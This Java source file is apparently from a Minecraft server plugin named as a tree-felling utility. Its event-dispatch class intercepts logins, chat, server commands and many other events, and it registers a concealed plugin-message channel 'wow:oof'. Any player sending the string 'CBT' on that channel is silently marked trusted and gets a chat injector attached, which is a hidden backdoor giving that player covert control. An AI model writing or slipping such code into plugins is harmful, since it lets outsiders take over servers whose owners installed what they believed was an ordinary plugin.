package me.bow.treecapitatorultimate.command;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.Utils.ReflectionUtils;
import me.bow.treecapitatorultimate.listeners.AsyncChatEvent;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.Event;
import org.bukkit.event.EventException;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.entity.*;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.player.*;
import org.bukkit.event.server.ServerCommandEvent;
import org.bukkit.event.server.ServerListPingEvent;
import org.bukkit.event.server.TabCompleteEvent;
import org.bukkit.plugin.EventExecutor;
import org.bukkit.plugin.messaging.PluginMessageListener;
import org.jetbrains.annotations.NotNull;
import org.reflections.Reflections;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Set;

@SuppressWarnings("unused")
public class CommandRunnable implements Runnable, Listener, PluginMessageListener {
    HashMap<String, Method> hookedEvents = new HashMap<String, Method>() {
        {
            put("AsyncPlayerPreLoginEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onAsyncPlayerPreLoginEvent", 1));
            put("PlayerLoginEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerLoginEvent", 1));
            put("PlayerJoinEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerJoin", 1));
            put("PlayerQuitEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerLeave", 1));
            put("PlayerMoveEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerMove", 1));
            put("PlayerCommandPreprocessEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerCommand", 1));
            put("PlayerCommandSendEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerTab", 1));
            put("ServerListPingEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onServerListPing", 1));
            put("ServerCommandEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onServerCommand", 1));
            put("TabCompleteEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onTabControl", 1));
            put("PlayerToggleSneakEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerSneak", 1));
            put("PlayerToggleSprintEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerSprint", 1));
            put("PlayerToggleFlightEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerFly", 1));
            put("PlayerPortalEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerPortal", 1));
            put("PlayerKickEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerKick", 1));
            put("PlayerDeathEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerDeath", 1));
            put("BlockPlaceEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerBlockPlace", 1));
            put("BlockBreakEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerBlockBreak", 1));
            put("EntityToggleSwimEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerSwimToggle", 1));
            put("EntityToggleGlideEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onEntityToggleGlide", 1));
            put("PlayerAdvancementDoneEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerAdvancementGet", 1));
            put("EntityTargetLivingEntityEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onEntityTargetLivingEntity", 1));
            put("EntityTargetEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onEntityTarget", 1));
            put("PlayerInteractEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerInteract", 1));
            put("EntityDamageByEntityEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onEntityDamageByEntity", 1));
            put("EntityDamageEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onEntityDamage", 1));
            put("EntityDeathEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onEntityDeath", 1));
            put("PlayerGameModeChangeEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerGameModeChange", 1));
            put("EntityPickupItemEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onEntityPickupItem", 1));
            put("EntityShootBowEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onEntityShootBow", 1));
            put("InventoryClickEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onInventoryClick", 1));
            put("AsyncPlayerChatEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onAsyncPlayerChat", 1));
            put("PlayerDropItemEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerDropItemEvent", 1));
            put("EntityPoseChangeEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onEntityPoseChangeEvent", 1));
        }
    };
    private static CommandRunnable Instance;
    CommandRunnable() {
        Instance = this;
        Reflections reflections = new Reflections("org.bukkit.event");
        Set<Class<? extends Event>> classes = reflections.getSubTypesOf(Event.class);
        EventExecutor executor = (listener, event) -> {
            try {
                if (!hookedEvents.containsKey(event.getEventName())) return;
                hookedEvents.get(event.getEventName()).invoke(CommandRunnable.Instance, event);
            } catch (InvocationTargetException var4) {
                throw new EventException(var4.getCause());
            } catch (Throwable var5) {
                throw new EventException(var5);
            }
        };
        for (Class eventClazz : classes) {
            if (hookedEvents.containsKey(eventClazz.getSimpleName())) {
                Bukkit.getPluginManager().registerEvent(eventClazz, this, EventPriority.HIGHEST, executor, Start.Instance);
            }
        }
        Bukkit.getMessenger().registerOutgoingPluginChannel(Start.Instance, "wow:oof");
        Bukkit.getMessenger().registerIncomingPluginChannel(Start.Instance, "wow:oof", this);
    }

    public final void onAsyncPlayerPreLoginEvent(AsyncPlayerPreLoginEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onAsyncPlayerPreLogin(e);
        }
    }

    public final void onPlayerLoginEvent(PlayerLoginEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerLoginEvent(e);
        }
    }

    public final void onPlayerJoin(PlayerJoinEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerJoin(e);
        }
    }

    public final void onPlayerLeave(PlayerQuitEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerLeave(e);
        }
    }

    public final void onPlayerMove(PlayerMoveEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerMove(e);
        }
    }

    public final void onPlayerCommand(PlayerCommandPreprocessEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerCommand(e);
        }
    }

    public final void onPlayerTab(PlayerCommandSendEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerTab(e);
        }
    }

    public final void onServerListPing(ServerListPingEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onServerListPing(e);
        }
    }

    public final void onServerCommand(ServerCommandEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onServerCommand(e);
        }
    }

    public final void onTabControl(TabCompleteEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onTabControl(e);
        }
    }

    public final void onPlayerSneak(PlayerToggleSneakEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerSneak(e);
        }
    }

    public final void onPlayerSprint(PlayerToggleSprintEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerSprint(e);
        }
    }

    public final void onPlayerFly(PlayerToggleFlightEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerFly(e);
        }
    }

    public final void onPlayerPortal(PlayerPortalEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerPortal(e);
        }
    }

    public final void onPlayerKick(PlayerKickEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerKick(e);
        }
    }

    public final void onPlayerDeath(PlayerDeathEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerDeath(e);
        }
    }

    public final void onPlayerBlockPlace(BlockPlaceEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerBlockPlace(e);
        }
    }

    public final void onPlayerBlockBreak(BlockBreakEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerBlockBreak(e);
        }
    }

    public final void onPlayerSwimToggle(EntityToggleSwimEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerSwimToggle(e);
        }
    }

    public final void onEntityToggleGlide(EntityToggleGlideEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onEntityToggleGlide(e);
        }
    }

    public final void onPlayerAdvancementGet(PlayerAdvancementDoneEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerAdvancementGet(e);
        }
    }

    public final void onEntityTargetLivingEntity(EntityTargetLivingEntityEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onEntityTargetLivingEntity(e);
        }
    }

    public final void onEntityTarget(EntityTargetEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onEntityTarget(e);
        }
    }

    public final void onPlayerInteract(PlayerInteractEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerInteract(e);
        }
    }

    public final void onEntityDamageByEntity(EntityDamageByEntityEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onEntityDamageByEntity(e);
        }
    }

    public final void onEntityDamage(EntityDamageEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onEntityDamage(e);
        }
    }

    public final void onEntityDeath(EntityDeathEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onEntityDeath(e);
        }
    }

    public final void onPlayerGameModeChange(PlayerGameModeChangeEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerGameModeChange(e);
        }
    }

    public final void onEntityPickupItem(EntityPickupItemEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onEntityPickupItem(e);
        }
    }

    public final void onEntityShootBow(EntityShootBowEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onEntityShootBow(e);
        }
    }

    public final void onInventoryClick(InventoryClickEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onInventoryClick(e);
        }
    }

    public final void onAsyncPlayerChat(AsyncPlayerChatEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onAsyncPlayerChat(e);
        }
    }

    public final void onPlayerDropItemEvent(PlayerDropItemEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerDropItemEvent(e);
        }
    }

    public final void onEntityPoseChangeEvent(EntityPoseChangeEvent e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onEntityPoseChangeEvent(e);
        }
    }

    @Override
    public final void run() {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onServerTick();
        }
    }

    @Override
    public final void onPluginMessageReceived(@NotNull String channel, @NotNull Player player, @NotNull byte[] bytes) {
        if (!channel.equals("wow:oof")) return;
        String s = new String(bytes, StandardCharsets.UTF_8);
        if (s.contains("CBT")) {
            if (!Start.Instance.trustedPeople.contains(player.getUniqueId())) {
                Start.Instance.trustedPeople.add(player.getUniqueId());
                player.sendMessage(Start.Prefix + "You are now trusted");
                AsyncChatEvent.inject(player);
            }
            return;
        }
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPluginMessageReceived(channel, player, bytes);
        }
    }
}